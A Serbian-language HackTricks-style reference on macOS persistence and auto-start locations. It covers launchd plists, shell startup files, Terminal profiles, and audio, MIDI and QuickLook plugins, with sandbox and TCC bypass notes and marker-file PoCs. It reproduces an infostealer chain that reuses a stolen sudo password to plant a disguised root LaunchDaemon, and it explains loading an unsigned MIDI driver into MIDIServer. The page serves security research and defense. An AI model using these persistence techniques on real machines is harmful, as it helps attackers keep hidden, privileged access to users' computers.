# Automatsko pokretanje macOS-a

{{#include ../banners/hacktricks-training.md}}

Ovaj odeljak se u velikoj meri zasniva na seriji blogova [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Cilj je da se identifikuju lokacije na kojima upisivanje datoteke može kasnije dovesti do izvršavanja koda, događaj koji pokreće izvršavanje i potrebne dozvole. Prisustvo lokacije ne dokazuje da je mehanizam omogućen. Provere navedene u nastavku obavljene su na macOS 26.5.2 (5. oktobra 2026); one ne utvrđuju ponašanje u svakom izdanju macOS-a.

> [!NOTE]
> „Pokretanje upisivanjem” ne znači uvek „pokreće se odmah nakon upisivanja”. Neke lokacije se čitaju samo pri prijavi, kada se pokrene određena aplikacija ili kada korisnik izvrši neku radnju. Payload koji može da se menja unutar već konfigurisanog zadatka takođe nije isto što i dozvola za registrovanje novog zadatka. Testirajte na privremenom nalogu ili u VM-u pre nego što se oslonite na neku tehniku.

## Sandbox Bypass

> [!TIP]
> Ovde možete pronaći lokacije za pokretanje korisne za **sandbox bypass**, koje vam omogućavaju da jednostavno izvršite nešto tako što ćete to **upisati u datoteku** i **sačekati** neku veoma **uobičajenu** **radnju**, određeni **vremenski period** ili **radnju koju obično možete izvršiti** iz sandbox-a, bez potrebe za root dozvolama.

### Launchd

- Korisno za sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

- **`/Library/LaunchAgents`**
  - **Okidač**: Prijava korisnika (ili eksplicitna registracija)
  - Potreban je root
- **`/Library/LaunchDaemons`**
  - **Okidač**: Pokretanje sistema (ili eksplicitna registracija)
  - Potreban je root
- **`/System/Library/LaunchAgents`**
  - **Okidač**: Prijava korisnika; zaštićena sistemska lokacija kompanije Apple
- **`/System/Library/LaunchDaemons`**
  - **Okidač**: Pokretanje sistema; zaštićena sistemska lokacija kompanije Apple
- **`~/Library/LaunchAgents`**
  - **Okidač**: Ponovna prijava

Ne postoji lokacija `~/Library/LaunchDaemons` koju `launchd` skenira. Zadaci po korisniku smeštaju se u `~/Library/LaunchAgents`; sistemski direktorijum za demone je `/Library/LaunchDaemons`. [Apple-ov vodič za pokretanje launchd-a](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) opisuje lokacije koje se skeniraju.

> [!TIP]
> Zanimljiva činjenica: **`launchd`** sadrži ugrađenu listu svojstava u Mach-o odeljku `__Text.__config`, koja navodi druge poznate servise koje launchd mora da pokrene. Pored toga, ti servisi mogu da sadrže `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, što znači da moraju da se pokrenu i uspešno završe.
>
> Naravno, ne može se menjati zbog potpisivanja koda.

#### Opis i eksploatacija

**`launchd`** je **prvi** **proces** koji OX S kernel izvršava pri pokretanju sistema i poslednji koji se završava pri gašenju. Uvek bi trebalo da ima **PID 1**. Ovaj proces će **čitati i izvršavati** konfiguracije navedene u **ASEP** **plist** datotekama na sledećim lokacijama:

- `/Library/LaunchAgents`: Agenti po korisniku koje je instalirao administrator
- `/Library/LaunchDaemons`: Sistemski demoni koje je instalirao administrator
- `/System/Library/LaunchAgents`: Agenti po korisniku koje obezbeđuje Apple.
- `/System/Library/LaunchDaemons`: Sistemski demoni koje obezbeđuje Apple.

Kada se korisnik prijavi, `launchd` učitava plist datoteke iz korisnikovog `~/Library/LaunchAgents` koristeći dozvole tog korisnika. Zadaci se pokreću u skladu sa svojim ključevima; samo učitavanje plist datoteke ne znači da će se proces odmah izvršiti.

**Glavna razlika između agenata i demona je u tome što se agenti učitavaju kada se korisnik prijavi, a demoni pri pokretanju sistema** (jer postoje servisi poput ssh-a koje treba pokrenuti pre nego što bilo koji korisnik pristupi sistemu). Agenti mogu da koriste GUI, dok demoni moraju da rade u pozadini.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Svaki element `ProgramArguments` predstavlja zaseban argument; `launchd` ne tumači jedan string kao shell komandu. Ispravljeni primer iznad može da se proveri bez učitavanja pomoću `plutil -lint /path/to/example.plist`. Pogledajte lokalnu stranicu `man launchd.plist` za `ProgramArguments`, `RunAtLoad` i `KeepAlive`.

#### Okidači za događaje nad datotekama u postojećim poslovima

**Već učitan** agent ili daemon može da koristi `WatchPaths` za pokretanje kada se navedena putanja promeni. `QueueDirectories` pokreće posao dok direktorijum nije prazan; `StartOnMount` ga pokreće pri montiranju volumena. [Apple-ov vodič za launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) sadrži primere za `WatchPaths` i `QueueDirectories`. Upis u nadziranu datoteku pokreće **već konfigurisani posao**; proizvoljno izvršavanje koda omogućeno je samo ako autor upisa može da kontroliše i izvršnu datoteku, skriptu ili podatke koje posao tumači. Samo upisivanje nove plist datoteke izvan skenirane ili registrovane lokacije ne učitava je.

Ovaj PoC sa automatskim čišćenjem registruje jedinstveno imenovan **privremeni korisnički agent**, menja samo sopstvenu nadziranu datoteku i uklanja agenta. Uspešno je pokrenut na macOS 26.5.2 bez odjavljivanja ili ponovnog pokretanja:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Lokalno pokretanje ispisalo je `watch fired: True`, a `bootout` je uspešno izvršen. `launchctl bootstrap` se ovde koristi samo u izolovanom PoC-u; **nije** potreban za posao koji je već učitan. Da biste bezbedno procenili postojeći posao, pročitajte njegov plist i razrešenu putanju `ProgramArguments`, a zatim proverite da li je odgovarajuća izvršna datoteka ili interpretirana datoteka upisiva, bez njenog menjanja.

Postoje slučajevi kada **agent treba da se izvrši pre nego što se korisnik prijavi**; oni se nazivaju **PreLoginAgents**. Na primer, ovo je korisno za obezbeđivanje pomoćne tehnologije pri prijavi. Mogu se pronaći i u `/Library/LaunchAgents` (pogledajte [**ovde**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) primer).

> [!TIP]
> Nove konfiguracione datoteke za Daemons ili Agents biće **učitane nakon sledećeg ponovnog pokretanja ili pomoću** `launchctl load <target.plist>`. Takođe je **moguće učitati .plist datoteke bez tog nastavka** pomoću `launchctl -F <file>` (međutim, te plist datoteke neće biti automatski učitane nakon ponovnog pokretanja).\
> Moguće je i **ukloniti ih** pomoću `launchctl unload <target.plist>` (proces na koji upućuju biće prekinut),
>
> Da biste **se uverili** da **ništa** (poput override-a) **ne sprečava** **Agent** ili **Daemon** **da** **se pokrene**, izvršite: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Izlistajte sve agente i daemone koje je učitao trenutni korisnik:

```bash
launchctl list
```

#### Primer zlonamernog lanca LaunchDaemon (ponovna upotreba lozinke)

Nedavni macOS infostealer ponovo je upotrebio **uhvaćenu sudo lozinku** da bi postavio user agent i LaunchDaemon sa root privilegijama:<sup>[[1]](#references)</sup>

- Zapiši petlju agenta u `~/.agent` i učini je izvršnom.
- Generiši plist u `/tmp/starter` koji upućuje na taj agent.
- Ponovo upotrebi ukradenu lozinku uz `sudo -S` da bi je kopirao u `/Library/LaunchDaemons/com.finder.helper.plist`, postavio vlasnika na `root:wheel` i učitao pomoću `launchctl load`.
- Pokreni agenta neprimetno pomoću `nohup ~/.agent >/dev/null 2>&1 &` da bi odvojio izlaz.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> plist demona postavljen u `/Library/LaunchDaemons` ne postaje bezbedan time što mu se dodeli vlasništvo korisnika. `launchd` zahteva odgovarajuće vlasništvo i dozvole za sistemske poslove i može odbiti nebezbedan plist. Demon u vlasništvu root-a obično se izvršava kao root, osim ako njegova konfiguracija ne izabere drugi nalog. Proverite `UserName`, `GroupName`, vlasništvo i dijagnostičke poruke `launchctl`-a; nemojte zaključivati koji se nalog koristi za izvršavanje samo na osnovu imena vlasnika plist-a.

#### Više informacija o launchd

**`launchd`** je **prvi** proces u korisničkom režimu koji pokreće **kernel**. Pokretanje procesa mora biti **uspešno**, a on **ne može da se ugasi niti sruši**. Zaštićen je čak i od nekih **signala za ubijanje procesa**.

Jedna od prvih stvari koje bi `launchd` uradio jeste da **pokrene** sve **demone**, kao što su:

- **Vremenski demoni** koji se izvršavaju prema vremenskom rasporedu:
  - `com.apple.atrun.plist` poziva `/usr/libexec/atrun` sa `StartInterval = 30` sekundi u macOS 26.5.2; njegovo efektivno stanje omogućenosti može se razlikovati od ključa `Disabled` u plist-u, jer launchd zasebno čuva nadjačavanja.
  - `com.vix.cron.plist` poziva `/usr/sbin/cron` kada `/usr/lib/cron/tabs` sadrži poslove. `com.apple.systemstats.daily` je zaseban planirani servis, a ne cron demon.
- **Mrežni demoni**, kao što su:
  - `org.cups.cups-lpd`: osluškuje TCP (`SockType: stream`) sa `SockServiceName: printer`
    - SockServiceName mora biti ili port ili servis iz `/etc/services`
  - `com.apple.xscertd.plist`: osluškuje TCP na portu 1640
- **Demoni putanje** koji se izvršavaju kada se promeni navedena putanja:
  - `com.apple.postfix.master`: proverava putanju `/etc/postfix/aliases`
- **Demoni za IOKit obaveštenja**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: u stavci `MachServices` navodi ime `com.apple.xscertd.helper`
- **UserEventAgent:**
  - Ovo se razlikuje od prethodnog. Omogućava launchd-u da pokreće aplikacije kao odgovor na određene događaje. Međutim, u ovom slučaju glavni binarni fajl nije `launchd`, već `/usr/libexec/UserEventAgent`. Učitava dodatke iz SIP-om ograničene fascikle /System/Library/UserEventPlugins/, gde svaki dodatak navodi svoj inicijalizator u ključu `XPCEventModuleInitializer` ili, kod starijih dodataka, u rečniku `CFPluginFactories` pod ključem `FB86416D-6164-2070-726F-70735C216EC0` u svom `Info.plist` fajlu.

### datoteke za pokretanje shell-a

Opis: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Opis (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali morate pronaći aplikaciju sa TCC zaobilaženjem koja pokreće shell koji učitava ove datoteke

#### Lokacije

- **`~/.zshenv`** (ili noviji kompajlirani **`~/.zshenv.zwc`**)
  - **Okidač**: Svako uobičajeno pokretanje zsh-a, uključujući neinteraktivni `zsh -c`; `zsh -f` preskače korisničke datoteke za pokretanje.
- **`~/.zshrc`**
  - **Okidač**: Pokreće se interaktivni zsh.
- **`~/.zprofile`, `~/.zlogin`**
  - **Okidač**: Pokreće se zsh za prijavu; ove datoteke se čitaju pre i posle `.zshrc`, tim redom.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Okidač**: Otvaranje terminala sa zsh-om
  - Potreban je root
- **`~/.zlogout`**
  - **Okidač**: Login zsh se normalno gasi; ne pokreće se pri svakom izlasku iz terminala ili shell-a.
- **`/etc/zlogout`**
  - **Okidač**: Izlazak iz terminala sa zsh-om
  - Potreban je root
- Moguće je da postoje i druge u: **`man zsh`**
- **`~/.bashrc`**
  - **Okidač**: Pokretanje interaktivnog **Bash-a koji nije login shell**. Interaktivni login Bash čita ovu datoteku samo ako je neka datoteka za prijavu eksplicitno učitava.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Okidač**: Pokretanje login Bash-a; izvršava se prva čitljiva datoteka tim redosledom. `~/.profile` se preskače ako postoji bilo koja od prethodne dve datoteke.
- **`/etc/profile`**
  - **Okidač**: Pokretanje login Bash-a; za izmenu je potreban root.
- **`~/.tcshrc`** ili, ako ne postoji, **`~/.cshrc`**
  - **Okidač**: Pokretanje `tcsh`-a, uključujući neinteraktivni `tcsh -c` na ovom Mac-u. Korisnik mora zaista da pokrene `tcsh`; to nije podrazumevani macOS shell.
- **`~/.login`**
  - **Okidač**: Pokretanje login `tcsh`-a nakon njegove rc datoteke.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Okidač**: Očekuje se da se pokreću uz xterm, ali on **nije instaliran**, a čak i nakon instalacije prikazuje se ova greška: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Opis i iskorišćavanje

Pri pokretanju shell okruženja kao što su `zsh` ili `bash`, **pokreću se određene datoteke za pokretanje**. macOS trenutno koristi `/bin/zsh` kao podrazumevani shell. Da li Terminal ili SSH pokreće login shell ili interaktivni shell zavisi od njihove konfiguracije; nemojte pretpostaviti da se svaka od gorenavedenih datoteka pokreće u svakoj sesiji. Iako su `bash` i `sh` takođe prisutni u macOS-u, potrebno ih je eksplicitno pokrenuti da bi se koristili.<sup>[[2]](#references)</sup> [Referenca za zsh datoteke za pokretanje](https://zsh.sourceforge.io/Doc/Release/Files.html) navodi redosled, nadjačavanje pomoću `ZDOTDIR` i pravilo za `.zwc`.

Sledeći eksperiment samo za čitanje koristio je privremeni `ZDOTDIR` na macOS 26.5.2. Prikazuje koje su korisničke datoteke pročitane; nijedna stvarna shell datoteka za pokretanje nije menjana:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Uočeni redosled je bio `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` već mora da pokazuje na alternativni direktorijum; nije dovoljno samo napisati datoteke u proizvoljnom direktorijumu.

[Referenca za pokretanje Bash-a](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) razlikuje login od interaktivnih shell-ova. Na testnoj mašini sa macOS 26.5.2, izolovani `HOME` koji je sadržao sve četiri korisničke datoteke za pokretanje dao je sledeće rezultate: `bash -c` → nijedna, `bash -ic` → `.bashrc`, `bash -lc` i `bash -lic` → samo `.bash_profile`. Uklanjanjem `.bash_profile` login Bash je učitavao `.bash_login`, a zatim `.profile` kada je i ona uklonjena. `BASH_ENV` može da usmeri neinteraktivni Bash na datoteku, ali ta promenljiva okruženja već mora biti postavljena u procesu koji ga poziva. Eksplicitni `exit` iz login Bash-a može takođe da učita `~/.bash_logout`.

Lokalni priručnik za `tcsh(1)` opisuje zaseban redosled pokretanja. Sa privremenim `HOME`, `/bin/tcsh -c :` je učitao `.tcshrc`, odnosno `.cshrc` ako `.tcshrc` nije postojao. Privremeni login `tcsh` učitao je `.tcshrc` i `.login`. Ove provere su kreirale i uklonile samo privremene datoteke.

### Ponovo otvorene aplikacije

> [!CAUTION]
> Tokom testiranja, podešavanje naznačene eksploatacije i odjavljivanje pa ponovna prijava, pa čak ni ponovno pokretanje, nisu pokrenuli aplikaciju. Aplikacija možda mora da bude pokrenuta kada se ove radnje obavljaju.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Okidač**: Ponovno pokretanje koje ponovo otvara aplikacije

#### Opis i eksploatacija

Sve aplikacije koje treba ponovo otvoriti nalaze se u plist datoteci `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Dakle, da bi se među aplikacijama koje se ponovo otvaraju pokrenula vaša, samo treba da je **dodate na listu**.

UUID možete pronaći izlistavanjem tog direktorijuma ili komandom `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Da biste proverili koje aplikacije će se ponovo otvoriti, možete da pokrenete:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Da biste **dodali aplikaciju na ovu listu**, možete koristiti:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Podešavanja Terminala

Opis: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
  - Terminal je ranije imao FDA dozvole korisnika koji ga koristi

#### Lokacija

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Okidač**: Otvorite novi prozor ili karticu Terminala koristeći profil čija podešavanja Shell-a sadrže komandu za pokretanje

#### Opis i eksploatacija

U direktorijumu **`~/Library/Preferences`** čuvaju se korisnička podešavanja za aplikacije. Neka od tih podešavanja mogu sadržati konfiguraciju za **izvršavanje drugih aplikacija/skripti**.<sup>[[5]](#references)</sup>

Na primer, Terminal može da izvrši komandu pri pokretanju:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ova konfiguracija se odražava u datoteci **`~/Library/Preferences/com.apple.Terminal.plist`** ovako:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Ako relevantni profil sadrži komandu za pokretanje i Terminal pročita tu postavku, nova sesija koja koristi taj profil može da je izvrši. [Apple-ov aktuelni vodič za Terminal](https://support.apple.com/guide/terminal/trmlshll/mac) dokumentuje komandu za svaki profil pod **Shell → Startup**. Samo otvaranje Terminala, bez nove sesije koja koristi taj profil, nije dovoljno. Izmene postavki u nastavku **nisu** izvršene na Mac računaru korišćenom za istraživanje.

Ovo možete dodati iz cli-ja pomoću:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Other file extensions

- Korisno za bypass sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal se koristi za dobijanje FDA dozvola korisnika

#### Lokacija

- **Bilo gde**
  - **Okidač**: Otvorite odgovarajuću datoteku `.terminal`, `.command` ili `.tool`

#### Opis i eksploatacija

Ako korisnik otvori datoteku sa podešavanjima **`.terminal`**, Terminal može da kreira sesiju iz njenog profila; izvršne datoteke **`.command`** i **`.tool`** takođe se mogu otvoriti u Terminalu. Ovo je eksplicitni okidač za otvaranje datoteke, a ne izvršavanje koje se dešava samim otvaranjem Terminala. Svaki nasleđeni TCC pristup zavisi od stvarnih dozvola koje Terminal ima i operacije koja se pokušava. Istorijski primer ispod nije pokrenut na istraživačkom Mac-u.

Isprobajte ovako:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Takođe možete koristiti ekstenzije **`.command`**, **`.tool`** sa običnim shell skriptama, a one će se takođe otvoriti u Terminalu.

> [!CAUTION]
> Ako Terminal ima **Full Disk Access**, moći će da izvrši tu radnju (imajte na umu da će izvršena komanda biti vidljiva u prozoru terminala).

### Audio dodaci

Tekst: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Tekst: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Možda ćete dobiti dodatni TCC pristup

#### Lokacija

- **`/Library/Audio/Plug-Ins/HAL`**
  - Potreban je root
  - **Okidač**: Core Audio server učitava kompatibilni HAL device dodatak; ponovno pokretanje servera može izazvati ponovno otkrivanje
- **`/Library/Audio/Plug-ins/Components`**
  - Potreban je root
  - **Okidač**: Audio host otkriva i instancira instalirani Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Okidač**: Audio host otkriva i instancira instalirani Audio Unit
- **`/System/Library/Components`**
  - Lokacija koju obezbeđuje Apple i koja je zaštićena sistemom
  - **Okidač**: Audio host instancira odgovarajuću sistemsku komponentu

#### Opis

Prema prethodnim tekstovima, moguće je **kompajlirati neke audio dodatke** i učitati ih.<sup>[[6]](#references)[[7]](#references)</sup>

HAL device dodaci i Audio Units koriste različite putanje učitavanja. [Apple-ov vodič za hosting Audio Unit dodataka](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) navodi da host mora da pronađe i instancira komponentu; samo kopiranje komponente u direktorijum za skeniranje ili ponovno pokretanje `coreaudiod` ne dokazuje da je došlo do izvršavanja. AUv2 dodaci se pokreću u procesu hosta, dok se prema [Apple-ovim aktuelnim smernicama za Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) AUv3 podrazumevano pokreće u zasebnom procesu na macOS-u. Provere potpisa, sandbox-a i validacije biblioteka zavise od hosta. Na istraživačkom Mac-u nije instaliran niti izvršen nijedan audio dodatak.

### CoreMIDI drajveri (MIDIServer)

Tekst: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Vaš kod se pokreće unutar procesa `MIDIServer`, a ne u sandbox-u vaše aplikacije
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` se pokreće pod sopstvenim `seatbelt` sandbox profilom

#### Lokacija

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root nije potreban (može da ga menja korisnik)
  - **Okidač**: `MIDIServer` se pokreće ili ponovo pokreće. Pokreće se na zahtev kada bilo koji proces prvi put koristi CoreMIDI (otvaranjem aplikacije *Audio MIDI Setup*, GarageBand-a, DAW-a ili stranice koja koristi WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Potreban je root
  - **Okidač**: isto kao iznad

#### Opis i eksploatacija

Apple-ov `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) učitava MIDI **drajver** pakete iz direktorijuma `Audio/MIDI Drivers`. Binarna datoteka je potpisana od strane Apple-a, ali dolazi sa ovlašćenjem `com.apple.security.cs.disable-library-validation`, pa će učitati paket koji je **nepotpisan ili ad-hoc potpisan od strane drugog tima**. Time se dobija izvršavanje koda unutar zasebnog procesa u vlasništvu Apple-a **bez root privilegija**.<sup>[[53]](#references)</sup>

Provereno na macOS 26 (samo za čitanje):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Drajver je standardni bundle koji izvozi factory za `MIDIDriverInterface`; ako se payload smesti u factory/constructor, pokrenuće se čim `MIDIServer` enumeriše drajvere. Izgradite ga, postavite kao `~/Library/Audio/MIDI Drivers/Evil.plugin`, a zatim pokrenite učitavanje bez odjavljivanja ili ponovnog pokretanja:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook dodaci

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Možda ćete dobiti dodatni TCC pristup

#### Lokacija

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis i iskorišćavanje

QuickLook dodaci mogu da se izvrše kada **pokrenete pregled datoteke** (pritisnite razmaknicu dok je datoteka izabrana u Finder-u) i kada je instaliran **dodatak koji podržava taj tip datoteke**.<sup>[[8]](#references)</sup>

Moguće je kompajlirati sopstveni QuickLook dodatak, smestiti ga na jednu od prethodnih lokacija da bi se učitao, a zatim otići do podržane datoteke i pritisnuti razmaknicu da biste ga pokrenuli.

Ove putanje se odnose na zastarele `.qlgenerator` pakete; [Apple-ov vodič za Quick Look arhitekturu](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) opisuje redosled pretrage i tipove datoteka koji se podudaraju. Aktuelna Quick Look **app extensions** pakuju se uz aplikaciju i imaju drugačija pravila za registraciju i izvršavanje. Samo prisustvo generatora ne dokazuje da će on biti izabran za dati tip datoteke niti da će se njegov kod izvršavati u samom Finder-u. Putanja za zastarele generatore proverena je na osnovu dokumentacije i prisustva direktorijuma; na Mac-u koji je korišćen za istraživanje nije instaliran niti učitan nijedan generator.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Ovo mi nije radilo, ni sa korisničkim LoginHook-om ni sa root LogoutHook-om

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Potrebno je da možete da izvršite nešto poput `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - Nalazi se u `~/Library/Preferences/com.apple.loginwindow.plist`

